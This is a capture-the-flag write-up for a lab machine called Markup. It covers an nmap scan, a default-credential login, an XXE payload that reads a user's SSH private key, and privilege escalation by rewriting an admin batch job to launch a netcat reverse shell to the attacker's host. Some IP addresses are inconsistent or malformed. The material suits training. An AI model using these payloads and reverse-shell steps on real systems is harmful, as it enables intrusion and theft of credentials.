# Writeup – Markup 

## Attack Path
### 1. Nmap scan
sudo nmap -sC -A -Pn 10.129.21.179

## 2. Go to the webserver by typing 10.129.95.192:80 into browser and use credentials admin:password to login

## 3. Start BurpSuite, set up FroxyProxy to intercept requests from port 8080 and interact with the input fields by filling in some random information and pressing the Submit button.

## 4. In BurpSuite, send the request to the Repeater module by right-clicking on the request and clicking pressing the Send to Repeater or by  CTRL + R combination on your keyboard. Then, switch to the Repeater tab at the top of the BurpSuite window and change the XML data section of the request to the following:
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>

## 5. Run SSH to login as daniel
touch id_rsa
ls -la id_rsa
chmod 400 id_rsa
ssh -i id_rsa daniel@10.129.21.6
user flag can be retrieved from  C:\Users\daniel\Desktop

## 6. Privilege escalation
- cd C:\
- dir
- cd Log-Management to explore this folder
- The purpose of job.bat seems to be related to clearing logfiles, and it can only be run with an Administrator account. There is also mention of an executable named wevtutil , which upon further investigation is determined to be a Windows command that has the ability to retrieve information about event logs and publishers.
- icalcls job.bat
- powershell
- ps to confirm that wevtutil is running
- download nc64.exe from https://github.com/rahuldottech/netcat-for-windows/releases
- In the local host start python server sudo python3 -m http.server 8000
- In the powershell in the server, download the file wget http://10.10.15.2222/nc64.exe -   outfile nc64.exe
- echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.15.222 1234 > C:\Log-Management\job.bat
- start a listener in the host sudo nc -lvnp 1234, now you will receive windows shell in it
- type type C:\Users\Administrator\Desktop\root.txt to find out root flag


